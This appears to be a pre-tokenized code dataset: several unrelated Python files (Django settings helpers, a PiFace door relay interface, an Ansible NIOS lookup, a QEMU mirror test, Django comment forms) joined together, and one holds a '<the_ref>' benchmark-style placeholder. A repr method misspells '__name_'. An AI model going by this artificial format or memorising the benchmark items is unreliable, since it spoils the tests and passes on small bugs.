from importlib import import_module <newline> from django . conf import settings as django_settings <newline> from django . core . cache import cache <newline> from suds . cache import Cache <newline> from postnl_checkout . client import PostNLCheckoutClient <newline> class Singleton ( type ) : <newline> <indent>  """ <strnewline> ▁ Singleton ▁ metaclass. <strnewline> ▁ Source: <strnewline> ▁ http://stackoverflow.com/questions/6760685/creating-a-singleton-in-python <strnewline> ▁ """  <newline> _instances = { } <newline> def __call__ ( cls , * args , ** kwargs ) : <newline> <indent> if cls not in cls . _instances : <newline> <indent> cls . _instances [ cls ] = super ( Singleton , cls ) . __call__ ( * args , ** kwargs ) <newline> <dedent> return cls . _instances [ cls ] <newline> <dedent> <dedent> class SettingsBase ( object ) : <newline> <indent>  """ <strnewline> ▁ A ▁ settings ▁ object ▁ that ▁ proxies ▁ settings ▁ and ▁ handles ▁ defaults, ▁ inspired <strnewline> ▁ by ▁ `django-appconf` ▁ and ▁ the ▁ way ▁ it ▁ works ▁ in ▁ `django-rest-framework`. <strnewline> <strnewline> ▁ By ▁ default, ▁ a ▁ single ▁ instance ▁ of ▁ this ▁ class ▁ is ▁ created ▁ as ▁ `<app>_settings`, <strnewline> ▁ from ▁ which ▁ `<APP>_SETTING_NAME` ▁ can ▁ be ▁ accessed ▁ as ▁ `SETTING_NAME`, ▁ i.e.:: <strnewline> <strnewline> ▁ from ▁ myapp.settings ▁ import ▁ myapp_settings <strnewline> <strnewline> ▁ if ▁ myapp_settings.SETTING_NAME: <strnewline> ▁ # ▁ DO ▁ FUNKY ▁ DANCE <strnewline> <strnewline> ▁ If ▁ a ▁ setting ▁ has ▁ not ▁ been ▁ explicitly ▁ defined ▁ in ▁ Django's ▁ settings, ▁ defaults <strnewline> ▁ can ▁ be ▁ specified ▁ as ▁ `DEFAULT_SETTING_NAME` ▁ class ▁ variable ▁ or ▁ property. <strnewline> ▁ """  <newline> __metaclass__ = Singleton <newline> def __init__ ( self ) : <newline> <indent>  """ <strnewline> ▁ Assert ▁ app-specific ▁ prefix. <strnewline> ▁ """  <newline> assert hasattr ( self , 'settings_prefix' ) , 'No ▁ prefix ▁ specified.' <newline> <dedent> def __getattr__ ( self , attr ) : <newline> <indent>  """ <strnewline> ▁ Return ▁ Django ▁ setting ▁ `PREFIX_SETTING` ▁ if ▁ explicitly ▁ specified, <strnewline> ▁ otherwise ▁ return ▁ `PREFIX_SETTING_DEFAULT` ▁ if ▁ specified. <strnewline> ▁ """  <newline> if attr . isupper ( ) : <newline>  # ▁ Require ▁ settings ▁ to ▁ have ▁ uppercase ▁ characters <encdom> <indent> try : <newline> <indent> setting = getattr ( django_settings , '%s_%s' % ( self . settings_prefix , attr ) , ) <newline> <dedent> except AttributeError : <newline> <indent> if not attr . startswith ( 'DEFAULT_' ) : <newline> <indent> setting = getattr ( self , 'DEFAULT_%s' % attr ) <newline> <dedent> else : <newline> <indent> raise <newline> <dedent> <dedent> return setting <newline> <dedent> else : <newline>  # ▁ Default ▁ behaviour <encdom> <indent> raise AttributeError ( 'No ▁ setting ▁ or ▁ default ▁ available ▁ for ▁ \'%s\'' % attr ) <newline> <dedent> <dedent> <dedent> def import_object ( from_path ) : <newline> <indent>  """ ▁ Given ▁ an ▁ import ▁ path, ▁ return ▁ the ▁ object ▁ it ▁ represents. ▁ """  <newline> module , attr = from_path . rsplit ( "." , 1 ) <newline> mod = import_module ( module ) <newline> return getattr ( mod , attr ) <newline> <dedent> class SudsDjangoCache ( Cache ) : <newline> <indent>  """ <strnewline> ▁ Implement ▁ the ▁ suds ▁ cache ▁ interface ▁ using ▁ Django ▁ caching. <strnewline> ▁ Source: ▁ https://github.com/dpoirier/basket/blob/master/news/backends/exacttarget.py <strnewline> ▁ """  <newline> def __init__ ( self , days = None , * args , ** kwargs ) : <newline> <indent> if days : <newline> <indent> self . timeout = 24 * 60 * 60 * days <newline> <dedent> else : <newline> <indent> self . timeout = None <newline> <dedent> <dedent> def _cache_key ( self , id ) : <newline> <indent> return "suds-%s" % id <newline> <dedent> def get ( self , id ) : <newline> <indent> return cache . get ( self . _cache_key ( id ) ) <newline> <dedent> def put ( self , id , value ) : <newline> <indent> cache . set ( self . _cache_key ( id ) , value , self . timeout ) <newline> <dedent> def purge ( self , id ) : <newline> <indent> cache . delete ( self . _cache_key ( id ) ) <newline> <dedent> <dedent> def get_client ( ) : <newline> <indent>  """ ▁ Instantiate ▁ and ▁ return ▁ PostNLCheckoutClient ▁ for ▁ use ▁ with ▁ Django. ▁ """  <newline> from . settings import postnl_checkout_settings <newline> suds_cache = SudsDjangoCache ( ) <newline> client = PostNLCheckoutClient ( username = postnl_checkout_settings . USERNAME , password = postnl_checkout_settings . PASSWORD , webshop_id = postnl_checkout_settings . WEBSHOP_ID , environment = postnl_checkout_settings . ENVIRONMENT , timeout = postnl_checkout_settings . TIMEOUT , cache = suds_cache ) <newline> return client <newline> <dedent>
import logging <newline> import time <newline> class AbstractInterface ( object ) : <newline> <indent>  """ <strnewline> ▁ Generic ▁ interface ▁ definition ▁ providing ▁ minimum ▁ operation ▁ standard <strnewline> ▁ """  <newline> def __init__ ( self , * args , ** kwargs ) : <newline> <indent>  """ <strnewline> <strnewline> ▁ :param ▁ args: <strnewline> ▁ :param ▁ kwargs: <strnewline> ▁ :return: <strnewline> ▁ """  <newline> self . door_name = kwargs . get ( 'door_name' , "Default" ) <newline> <dedent> def activate ( self ) : <newline> <indent>  """ <strnewline> ▁ Wake ▁ up ▁ the ▁ interface <strnewline> ▁ :return: <strnewline> ▁ """  <newline> raise NotImplementedError ( "Abstract ▁ Interface" ) <newline> <dedent> def is_active ( self ) : <newline> <indent>  """ <strnewline> ▁ Bool ▁ response ▁ if ▁ interface ▁ is ▁ available ▁ and ▁ active <strnewline> ▁ :return: <strnewline> ▁ """  <newline> raise NotImplementedError ( "Abstract ▁ Interface" ) <newline> <dedent> def open ( self , duration = 10 ) : <newline> <indent>  """ <strnewline> ▁ Open ▁ the ▁ door ▁ for ▁ <duration> ▁ seconds <strnewline> <strnewline> ▁ Return ▁ state ▁ is ▁ constrained ▁ and ▁ this ▁ call ▁ may ▁ or ▁ may ▁ not ▁ be ▁ asynchronous <strnewline> ▁ :param ▁ duration: <strnewline> ▁ :return: <strnewline> ▁ """  <newline> raise NotImplementedError ( "Abstract ▁ Interface" ) <newline> <dedent> def is_open ( self ) : <newline> <indent>  """ <strnewline> ▁ (Optional) ▁ Detect ▁ if ▁ door ▁ is ▁ open. <strnewline> <strnewline> ▁ Return ▁"None" ▁ if ▁ no ▁ reed ▁ switch ▁ configured <strnewline> ▁ :return: <strnewline> ▁ """  <newline> return None <newline> <dedent> def __repr__ ( self ) : <newline> <indent>  """ <strnewline> ▁ Basic ▁ String ▁ Representation <strnewline> ▁ :return: ▁ str <strnewline> ▁ """  <newline> return "{type}(door_name=\"{door_name}\")" . format ( door_name = self . door_name , type = self . __class__ . __name_ ) <newline> <dedent> @ classmethod <newline> def import_prerequisites ( cls ) : <newline> <indent>  """ <strnewline> ▁ Lay ▁ the ▁ ground ▁ work <strnewline> ▁ """  <newline> pass <newline> <dedent> <dedent> class LoggingMixIn ( AbstractInterface ) : <newline> <indent>  """ <strnewline> ▁ Logging ▁ Version <strnewline> ▁ """  <newline> def __init__ ( self , * args , ** kwargs ) : <newline> <indent>  """ <strnewline> ▁ Instantiate ▁ logging ▁ interface <strnewline> ▁ :param ▁ args: <strnewline> ▁ :param ▁ kwargs: <strnewline> ▁ :return: <strnewline> ▁ """  <newline> AbstractInterface . __init__ ( self , * args , ** kwargs ) <newline> self . log = logging . getLogger ( "{}-{}" . format ( type ( self ) . __name__ , self . door_name ) ) <newline> self . log . debug ( "Initialised ▁ using ▁ : ▁ {}" . format ( kwargs ) ) <newline> <dedent> def activate ( self ) : <newline> <indent> self . log . debug ( "Activated" ) <newline> <dedent> def is_active ( self ) : <newline> <indent> self . log . debug ( "Checking ▁ activation" ) <newline> <dedent> def open ( self , duration = 10 ) : <newline> <indent> self . log . info ( "Opening ▁ for ▁ {}" . format ( duration ) ) <newline> <dedent> <dedent> class Dummy ( LoggingMixIn ) : <newline> <indent> open_status = False <newline> open_time = None <newline> def is_active ( self ) : <newline> <indent> super ( Dummy , self ) . is_active ( ) <newline> return True , True <newline> <dedent> def open ( self , duration = 0 ) : <newline> <indent>  """ <strnewline> ▁ True ▁ on ▁ success, ▁ False ▁ on ▁ Exception ▁ (not ▁ implemented), ▁ None ▁ on ▁'double ▁ jeopardy' <strnewline> ▁ """  <newline> LoggingMixIn . open ( self ) <newline> if not self . open_status : <newline> <indent> self . open_status = True <newline> self . open_time = time . time ( ) <newline> while time . time ( ) - self . open_time < duration : <newline> <indent> time . sleep ( 1.0 ) <newline> if not self . open_status : <newline> <indent> self . log . error ( "Door ▁ closed ▁ before ▁ told, ▁ possible ▁ race ▁ condition" ) <newline> <dedent> <dedent> self . open_status = False <newline> return True , "Door ▁ opened ▁ {}s ▁ ago" . format ( time . time ( ) - self . open_time ) <newline> <dedent> else : <newline> <indent> self . log . warn ( "Door ▁ already ▁ open" ) <newline> return None , "Door ▁ already ▁ open ▁ for ▁ {}s" . format ( time . time ( ) - self . open_time ) <newline> <dedent> <dedent> def is_open ( self ) : <newline> <indent> return self . open_status <newline> <dedent> def __repr__ ( self ) : <newline> <indent>  """ <strnewline> ▁ Basic ▁ String ▁ Representation <strnewline> ▁ :return: ▁ str <strnewline> ▁ """  <newline> return ( "{type}(door_name=\"{door_name}\", ▁ open={status}, ▁ open_time={open_time})" . format ( door_name = self . door_name , type = self . __class__ . __name__ , status = self . is_open ( ) , open_time = self . open_time ) ) <newline> <dedent> <dedent> class PiFace ( LoggingMixIn ) : <newline> <indent> pfd = None <newline> open_time = None <newline> def __init__ ( self , * args , ** kwargs ) : <newline> <indent> super ( PiFace , self ) . __init__ ( * args , ** kwargs ) <newline> try : <newline> <indent> import pifacedigitalio <newline> <dedent> except ImportError : <newline> <indent> raise ImportWarning ( "No ▁ PiFaceDigitalIO ▁ Module, ▁ Cannot ▁ instantiate ▁ PiFace" ) <newline> <dedent> self . pfd = pifacedigitalio . PiFaceDigital ( ) <newline> self . relay = kwargs . get ( 'interfaceopt' , 0 ) <newline> self . log . warn ( "Got ▁ Config ▁ {}" . format ( kwargs ) ) <newline> self . log . warn ( "Using ▁ Relay ▁ {}" . format ( self . relay ) ) <newline> <dedent> def is_active ( self ) : <newline> <indent> return self . pfd is not None <newline> <dedent> def _open ( self ) : <newline> <indent> self . pfd . relays [ self . relay ] . value = 1 <newline> self . pfd . leds [ self . relay ] . value = 1 <newline> self . open_time = time . time ( ) <newline> <dedent> def _close ( self ) : <newline> <indent> self . pfd . relays [ self . relay ] . value = 0 <newline> self . pfd . leds [ self . relay ] . value = 0 <newline> <dedent> def open ( self , duration = 1 ) : <newline> <indent> super ( PiFace , self ) . open ( duration ) <newline> self . _open ( ) <newline> while time . time ( ) - self . open_time < duration : <newline> <indent> time . sleep ( 1.0 ) <newline> <dedent> self . _close ( ) <newline> return True , "{} ▁ opened ▁ {}s ▁ ago" . format ( self . door_name , time . time ( ) - self . open_time ) <newline> <dedent> def is_open ( self , door = 0 ) : <newline> <indent> return self . pfd . relays [ door ] . value <newline> <dedent> def __repr__ ( self ) : <newline> <indent>  """ <strnewline> ▁ Basic ▁ String ▁ Representation <strnewline> ▁ :return: ▁ str <strnewline> ▁ """  <newline> return ( "{type}(door_name=\"{door_name}\", ▁ open={status}, ▁ open_time={open_time}, ▁ relay={relay})" . format ( door_name = self . door_name , type = self . __class__ . __name__ , status = self . is_open ( ) , relay = self . relay , open_time = self . open_time ) ) <newline> <dedent> @ classmethod <newline> def import_prerequisites ( cls ) : <newline> <indent>  """ <strnewline> ▁ Lay ▁ the ▁ ground ▁ work <strnewline> ▁ """  <newline> try : <newline> <indent> import pifacedigitalio <newline> <dedent> except ImportError : <newline> <indent> raise ImportWarning ( "No ▁ PiFaceDigitalIO ▁ Module, ▁ Cannot ▁ instantiate ▁ PiFace" ) <newline> <dedent> <dedent> <dedent>
class A : <newline> <indent> def foo ( self ) : <newline> <indent> < the_ref > self <newline> <dedent> <dedent>
 # ▁ Copyright ▁ 2018 ▁ Red ▁ Hat ▁ | ▁ Ansible <encdom>  # ▁ This ▁ file ▁ is ▁ part ▁ of ▁ Ansible <encdom>  # ▁ Ansible ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <encdom>  # ▁ the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the ▁ License, ▁ or <encdom>  # ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ Ansible ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ Ansible. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom> from __future__ import ( absolute_import , division , print_function ) <newline> __metaclass__ = type <newline> DOCUMENTATION =  """ <strnewline> --- <strnewline> lookup: ▁ nios <strnewline> version_added: ▁"2.5" <strnewline> short_description: ▁ Query ▁ Infoblox ▁ NIOS ▁ objects <strnewline> description: <strnewline> ▁ ▁ - ▁ Uses ▁ the ▁ Infoblox ▁ WAPI ▁ API ▁ to ▁ fetch ▁ NIOS ▁ specified ▁ objects. ▁ ▁ This ▁ lookup <strnewline> ▁ ▁ ▁ ▁ supports ▁ adding ▁ additional ▁ keywords ▁ to ▁ filter ▁ the ▁ return ▁ data ▁ and ▁ specify <strnewline> ▁ ▁ ▁ ▁ the ▁ desired ▁ set ▁ of ▁ returned ▁ fields. <strnewline> requirements: <strnewline> ▁ ▁ - ▁ infoblox-client <strnewline> extends_documentation_fragment: ▁ nios <strnewline> options: <strnewline> ▁ ▁ ▁ ▁ _terms: <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ description: ▁ The ▁ name ▁ of ▁ the ▁ object ▁ to ▁ return ▁ from ▁ NIOS <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ required: ▁ True <strnewline> ▁ ▁ ▁ ▁ return_fields: <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ description: ▁ The ▁ list ▁ of ▁ field ▁ names ▁ to ▁ return ▁ for ▁ the ▁ specified ▁ object. <strnewline> ▁ ▁ ▁ ▁ filter: <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ description: ▁ a ▁ dict ▁ object ▁ that ▁ is ▁ used ▁ to ▁ filter ▁ the ▁ return ▁ objects <strnewline> ▁ ▁ ▁ ▁ extattrs: <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ description: ▁ a ▁ dict ▁ object ▁ that ▁ is ▁ used ▁ to ▁ filter ▁ on ▁ extattrs <strnewline> """  <newline> EXAMPLES =  """ <strnewline> - ▁ name: ▁ fetch ▁ all ▁ networkview ▁ objects <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ networkviews: ▁"{{ ▁ lookup('nios', ▁ 'networkview', ▁ provider={'host': ▁ 'nios01', ▁ 'username': ▁ 'admin', ▁ 'password': ▁ 'password'}) ▁ }}" <strnewline> <strnewline> - ▁ name: ▁ fetch ▁ the ▁ default ▁ dns ▁ view <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ dns_views: ▁"{{ ▁ lookup('nios', ▁ 'view', ▁ filter={'name': ▁ 'default'}, ▁ provider={'host': ▁ 'nios01', ▁ 'username': ▁ 'admin', ▁ 'password': ▁ 'password'}) ▁ }}" <strnewline> <strnewline> # ▁ all ▁ of ▁ the ▁ examples ▁ below ▁ use ▁ credentials ▁ that ▁ are ▁ ▁ set ▁ using ▁ env ▁ variables <strnewline> # ▁ export ▁ INFOBLOX_HOST=nios01 <strnewline> # ▁ export ▁ INFOBLOX_USERNAME=admin <strnewline> # ▁ export ▁ INFOBLOX_PASSWORD=admin <strnewline> <strnewline> - ▁ name: ▁ fetch ▁ all ▁ host ▁ records ▁ and ▁ include ▁ extended ▁ attributes <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ host_records: ▁"{{ ▁ lookup('nios', ▁ 'record:host', ▁ return_fields=['extattrs', ▁ 'name', ▁ 'view', ▁ 'comment']}) ▁ }}" <strnewline> <strnewline> <strnewline> - ▁ name: ▁ use ▁ env ▁ variables ▁ to ▁ pass ▁ credentials <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ networkviews: ▁"{{ ▁ lookup('nios', ▁ 'networkview') ▁ }}" <strnewline> <strnewline> - ▁ name: ▁ get ▁ a ▁ host ▁ record <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ host: ▁"{{ ▁ lookup('nios', ▁ 'record:host', ▁ filter={'name': ▁ 'hostname.ansible.com'}) ▁ }}" <strnewline> <strnewline> - ▁ name: ▁ get ▁ the ▁ authoritative ▁ zone ▁ from ▁ a ▁ non ▁ default ▁ dns ▁ view <strnewline> ▁ ▁ set_fact: <strnewline> ▁ ▁ ▁ ▁ host: ▁"{{ ▁ lookup('nios', ▁ 'zone_auth', ▁ filter={'fqdn': ▁ 'ansible.com', ▁ 'view': ▁ 'ansible-dns'}) ▁ }}" <strnewline> """  <newline> RETURN =  """ <strnewline> obj_type: <strnewline> ▁ ▁ description: <strnewline> ▁ ▁ ▁ ▁ - ▁ The ▁ object ▁ type ▁ specified ▁ in ▁ the ▁ terms ▁ argument <strnewline> ▁ ▁ returned: ▁ always <strnewline> ▁ ▁ type: ▁ complex <strnewline> ▁ ▁ contains: <strnewline> ▁ ▁ ▁ ▁ obj_field: <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ - ▁ One ▁ or ▁ more ▁ obj_type ▁ fields ▁ as ▁ specified ▁ by ▁ return_fields ▁ argument ▁ or <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ the ▁ default ▁ set ▁ of ▁ fields ▁ as ▁ per ▁ the ▁ object ▁ type <strnewline> """  <newline> from ansible . plugins . lookup import LookupBase <newline> from ansible . module_utils . net_tools . nios . api import WapiLookup <newline> from ansible . module_utils . net_tools . nios . api import normalize_extattrs , flatten_extattrs <newline> from ansible . errors import AnsibleError <newline> class LookupModule ( LookupBase ) : <newline> <indent> def run ( self , terms , variables = None , ** kwargs ) : <newline> <indent> try : <newline> <indent> obj_type = terms [ 0 ] <newline> <dedent> except IndexError : <newline> <indent> raise AnsibleError ( 'the ▁ object_type ▁ must ▁ be ▁ specified' ) <newline> <dedent> return_fields = kwargs . pop ( 'return_fields' , None ) <newline> filter_data = kwargs . pop ( 'filter' , { } ) <newline> extattrs = normalize_extattrs ( kwargs . pop ( 'extattrs' , { } ) ) <newline> provider = kwargs . pop ( 'provider' , { } ) <newline> wapi = WapiLookup ( provider ) <newline> res = wapi . get_object ( obj_type , filter_data , return_fields = return_fields , extattrs = extattrs ) <newline> if res is not None : <newline> <indent> for obj in res : <newline> <indent> if 'extattrs' in obj : <newline> <indent> obj [ 'extattrs' ] = flatten_extattrs ( obj [ 'extattrs' ] ) <newline> <dedent> <dedent> <dedent> else : <newline> <indent> res = [ ] <newline> <dedent> return res <newline> <dedent> <dedent>
import logging <newline> from autotest . client . shared import utils <newline> from autotest . client . shared import error <newline> from qemu . tests import drive_mirror <newline> @ error . context_aware <newline> def run_drive_mirror_cancel ( test , params , env ) : <newline> <indent>  """ <strnewline> ▁ Test ▁ block ▁ mirroring ▁ functionality <strnewline> <strnewline> ▁ 1). ▁ boot ▁ vm ▁ then ▁ mirror ▁ $source_image ▁ to ▁ nfs/iscsi ▁ target <strnewline> ▁ 2). ▁ block ▁ nfs/iscsi ▁ serivce ▁ port ▁ via ▁ iptables ▁ rules <strnewline> ▁ 3). ▁ cancel ▁ block ▁ job ▁ and ▁ check ▁ it ▁ not ▁ cancel ▁ immedicatly <strnewline> ▁ 4). ▁ flush ▁ iptables ▁ chain ▁ then ▁ check ▁ job ▁ canceled ▁ in ▁ 10s <strnewline> <strnewline> ▁ """  <newline> tag = params . get ( "source_image" , "image1" ) <newline> mirror_test = drive_mirror . DriveMirror ( test , params , env , tag ) <newline> try : <newline> <indent> mirror_test . start ( ) <newline> error . context ( "Block ▁ network ▁ connection ▁ with ▁ iptables" , logging . info ) <newline> utils . run ( params [ "start_firewall_cmd" ] ) <newline> bg = utils . InterruptedThread ( mirror_test . cancel , ) <newline> bg . start ( ) <newline> job = mirror_test . get_status ( ) <newline> if job . get ( "type" , "0" ) != "mirror" : <newline> <indent> raise error . TestFail ( "Job ▁ cancel ▁ immediacatly" ) <newline> <dedent> error . context ( "Cleanup ▁ rules ▁ in ▁ iptables" , logging . info ) <newline> utils . run ( params [ "stop_firewall_cmd" ] ) <newline> bg . join ( timeout = int ( params [ "cancel_timeout" ] ) ) <newline> <dedent> finally : <newline> <indent> mirror_test . vm . destroy ( ) <newline> mirror_test . clean ( ) <newline> <dedent> <dedent>
import time <newline> import datetime <newline> from django import forms <newline> from django . forms . util import ErrorDict <newline> from django . conf import settings <newline> from django . contrib . contenttypes . models import ContentType <newline> from models import Comment <newline> from django . utils . crypto import salted_hmac , constant_time_compare <newline> from django . utils . encoding import force_unicode <newline> from django . utils . hashcompat import sha_constructor <newline> from django . utils . text import get_text_list <newline> from django . utils . translation import ungettext , ugettext_lazy as _ <newline> COMMENT_MAX_LENGTH = getattr ( settings , 'COMMENT_MAX_LENGTH' , 3000 ) <newline> class CommentSecurityForm ( forms . Form ) : <newline> <indent>  """ <strnewline> ▁ Handles ▁ the ▁ security ▁ aspects ▁ (anti-spoofing) ▁ for ▁ comment ▁ forms. <strnewline> ▁ """  <newline> content_type = forms . CharField ( widget = forms . HiddenInput ) <newline> object_pk = forms . CharField ( widget = forms . HiddenInput ) <newline> timestamp = forms . IntegerField ( widget = forms . HiddenInput ) <newline> security_hash = forms . CharField ( min_length = 40 , max_length = 40 , widget = forms . HiddenInput ) <newline> def __init__ ( self , target_object , data = None , initial = None ) : <newline> <indent> self . target_object = target_object <newline> if initial is None : <newline> <indent> initial = { } <newline> <dedent> initial . update ( self . generate_security_data ( ) ) <newline> super ( CommentSecurityForm , self ) . __init__ ( data = data , initial = initial ) <newline> <dedent> def security_errors ( self ) : <newline> <indent>  """ Return ▁ just ▁ those ▁ errors ▁ associated ▁ with ▁ security """  <newline> errors = ErrorDict ( ) <newline> for f in [ "honeypot" , "timestamp" , "security_hash" ] : <newline> <indent> if f in self . errors : <newline> <indent> errors [ f ] = self . errors [ f ] <newline> <dedent> <dedent> return errors <newline> <dedent> def clean_security_hash ( self ) : <newline> <indent>  """ Check ▁ the ▁ security ▁ hash. """  <newline> security_hash_dict = { 'content_type' : self . data . get ( "content_type" , "" ) , 'object_pk' : self . data . get ( "object_pk" , "" ) , 'timestamp' : self . data . get ( "timestamp" , "" ) , } <newline> expected_hash = self . generate_security_hash ( ** security_hash_dict ) <newline> actual_hash = self . cleaned_data [ "security_hash" ] <newline> if not constant_time_compare ( expected_hash , actual_hash ) : <newline>  # ▁ Fallback ▁ to ▁ Django ▁ 1.2 ▁ method ▁ for ▁ compatibility <encdom>  # ▁ PendingDeprecationWarning ▁ <- ▁ here ▁ to ▁ remind ▁ us ▁ to ▁ remove ▁ this <encdom>  # ▁ fallback ▁ in ▁ Django ▁ 1.5 <encdom> <indent> expected_hash_old = self . _generate_security_hash_old ( ** security_hash_dict ) <newline> if not constant_time_compare ( expected_hash_old , actual_hash ) : <newline> <indent> raise forms . ValidationError ( "Security ▁ hash ▁ check ▁ failed." ) <newline> <dedent> <dedent> return actual_hash <newline> <dedent> def clean_timestamp ( self ) : <newline> <indent>  """ Make ▁ sure ▁ the ▁ timestamp ▁ isn't ▁ too ▁ far ▁ (> ▁ 2 ▁ hours) ▁ in ▁ the ▁ past. """  <newline> ts = self . cleaned_data [ "timestamp" ] <newline> if time . time ( ) - ts > ( 2 * 60 * 60 ) : <newline> <indent> raise forms . ValidationError ( "Timestamp ▁ check ▁ failed" ) <newline> <dedent> return ts <newline> <dedent> def generate_security_data ( self ) : <newline> <indent>  """ Generate ▁ a ▁ dict ▁ of ▁ security ▁ data ▁ for ▁"initial" ▁ data. """  <newline> timestamp = int ( time . time ( ) ) <newline> security_dict = { 'content_type' : str ( self . target_object . _meta ) , 'object_pk' : str ( self . target_object . _get_pk_val ( ) ) , 'timestamp' : str ( timestamp ) , 'security_hash' : self . initial_security_hash ( timestamp ) , } <newline> return security_dict <newline> <dedent> def initial_security_hash ( self , timestamp ) : <newline> <indent>  """ <strnewline> ▁ Generate ▁ the ▁ initial ▁ security ▁ hash ▁ from ▁ self.content_object <strnewline> ▁ and ▁ a ▁ (unix) ▁ timestamp. <strnewline> ▁ """  <newline> initial_security_dict = { 'content_type' : str ( self . target_object . _meta ) , 'object_pk' : str ( self . target_object . _get_pk_val ( ) ) , 'timestamp' : str ( timestamp ) , } <newline> return self . generate_security_hash ( ** initial_security_dict ) <newline> <dedent> def generate_security_hash ( self , content_type , object_pk , timestamp ) : <newline> <indent>  """ <strnewline> ▁ Generate ▁ a ▁ HMAC ▁ security ▁ hash ▁ from ▁ the ▁ provided ▁ info. <strnewline> ▁ """  <newline> info = ( content_type , object_pk , timestamp ) <newline> key_salt = "django.contrib.forms.CommentSecurityForm" <newline> value = "-" . join ( info ) <newline> return salted_hmac ( key_salt , value ) . hexdigest ( ) <newline> <dedent> def _generate_security_hash_old ( self , content_type , object_pk , timestamp ) : <newline> <indent>  """ Generate ▁ a ▁ (SHA1) ▁ security ▁ hash ▁ from ▁ the ▁ provided ▁ info. """  <newline>  # ▁ Django ▁ 1.2 ▁ compatibility <encdom> info = ( content_type , object_pk , timestamp , settings . SECRET_KEY ) <newline> return sha_constructor ( "" . join ( info ) ) . hexdigest ( ) <newline> <dedent> <dedent> class CommentDetailsForm ( CommentSecurityForm ) : <newline> <indent>  """ <strnewline> ▁ Handles ▁ the ▁ specific ▁ details ▁ of ▁ the ▁ comment ▁ (name, ▁ comment, ▁ etc.). <strnewline> ▁ """  <newline> name = forms . CharField ( label = _ ( "Name" ) , max_length = 50 ) <newline> email = forms . EmailField ( label = _ ( "Email ▁ address" ) ) <newline> url = forms . URLField ( label = _ ( "URL" ) , required = False ) <newline> comment = forms . CharField ( label = _ ( 'Comment' ) , widget = forms . Textarea , max_length = COMMENT_MAX_LENGTH ) <newline> def get_comment_object ( self ) : <newline> <indent>  """ <strnewline> ▁ Return ▁ a ▁ new ▁ (unsaved) ▁ comment ▁ object ▁ based ▁ on ▁ the ▁ information ▁ in ▁ this <strnewline> ▁ form. ▁ Assumes ▁ that ▁ the ▁ form ▁ is ▁ already ▁ validated ▁ and ▁ will ▁ throw ▁ a <strnewline> ▁ ValueError ▁ if ▁ not. <strnewline> <strnewline> ▁ Does ▁ not ▁ set ▁ any ▁ of ▁ the ▁ fields ▁ that ▁ would ▁ come ▁ from ▁ a ▁ Request ▁ object <strnewline> ▁ (i.e. ▁ ``user`` ▁ or ▁ ``ip_address``). <strnewline> ▁ """  <newline> if not self . is_valid ( ) : <newline> <indent> raise ValueError ( "get_comment_object ▁ may ▁ only ▁ be ▁ called ▁ on ▁ valid ▁ forms" ) <newline> <dedent> CommentModel = self . get_comment_model ( ) <newline> new = CommentModel ( ** self . get_comment_create_data ( ) ) <newline> new = self . check_for_duplicate_comment ( new ) <newline> return new <newline> <dedent> def get_comment_model ( self ) : <newline> <indent>  """ <strnewline> ▁ Get ▁ the ▁ comment ▁ model ▁ to ▁ create ▁ with ▁ this ▁ form. ▁ Subclasses ▁ in ▁ custom <strnewline> ▁ comment ▁ apps ▁ should ▁ override ▁ this, ▁ get_comment_create_data, ▁ and ▁ perhaps <strnewline> ▁ check_for_duplicate_comment ▁ to ▁ provide ▁ custom ▁ comment ▁ models. <strnewline> ▁ """  <newline> return Comment <newline> <dedent> def get_comment_create_data ( self ) : <newline> <indent>  """ <strnewline> ▁ Returns ▁ the ▁ dict ▁ of ▁ data ▁ to ▁ be ▁ used ▁ to ▁ create ▁ a ▁ comment. ▁ Subclasses ▁ in <strnewline> ▁ custom ▁ comment ▁ apps ▁ that ▁ override ▁ get_comment_model ▁ can ▁ override ▁ this <strnewline> ▁ method ▁ to ▁ add ▁ extra ▁ fields ▁ onto ▁ a ▁ custom ▁ comment ▁ model. <strnewline> ▁ """  <newline> return dict ( content_type = ContentType . objects . get_for_model ( self . target_object ) , object_pk = force_unicode ( self . target_object . _get_pk_val ( ) ) , user_name = self . cleaned_data [ "name" ] , user_email = self . cleaned_data [ "email" ] , user_url = self . cleaned_data [ "url" ] , comment = self . cleaned_data [ "comment" ] , submit_date = datetime . datetime . now ( ) , site_id = settings . SITE_ID , is_public = True , is_removed = False , ) <newline> <dedent> def check_for_duplicate_comment ( self , new ) : <newline> <indent>  """ <strnewline> ▁ Check ▁ that ▁ a ▁ submitted ▁ comment ▁ isn't ▁ a ▁ duplicate. ▁ This ▁ might ▁ be ▁ caused <strnewline> ▁ by ▁ someone ▁ posting ▁ a ▁ comment ▁ twice. ▁ If ▁ it ▁ is ▁ a ▁ 